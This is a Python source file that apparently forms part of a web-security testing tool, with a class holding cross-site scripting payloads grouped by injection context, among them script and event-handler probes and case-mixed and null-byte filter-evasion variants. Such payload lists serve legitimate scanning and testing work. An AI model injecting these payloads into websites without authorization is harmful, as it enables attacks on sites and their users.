from enum import Enum
from typing import List, Dict


class InjectionContext(Enum):
    HTML_TEXT = "html_text"        # Example: <div>PAYLOAD</div>
    ATTRIBUTE_VALUE = "attr_value" # Example: <input value="PAYLOAD">
    ATTRIBUTE_NAME = "attr_name"   # Example: <div PAYLOAD="1">


class PayloadGenerator:
    """
    Payload Generator organized by injection context.
    """

    def __init__(self) -> None:
        self._payloads: Dict[InjectionContext, List[str]] = {
            InjectionContext.HTML_TEXT: [
                "<script>alert('XSS')</script>",
                "<svg/onload=alert(1)>",
                "<body onpageshow=alert(1)>",
                "<iframe/src=javascript:alert(1)>",
                "<ScRiPt>alert(1)</sCrIpT>",
            ],
            InjectionContext.ATTRIBUTE_VALUE: [
                "\"><script>alert(1)</script>",
                "\" onmouseover=\"alert(1)",
                "\" autofocus onfocus=\"alert(1)",
            ],
            InjectionContext.ATTRIBUTE_NAME: [
                "onmouseover",
                "onclick",
                "onfocus",
                "OnMoUsEoVeR",
                "oNcLiCk",
                "onmouseover%00",
            ],
        }

    def get_payloads(self, context: InjectionContext) -> List[str]:
        """Return payloads for a given injection context."""
        return self._payloads.get(context, [])

    def get_all_contexts(self) -> List[InjectionContext]:
        """Return all available injection contexts."""
        return list(self._payloads)
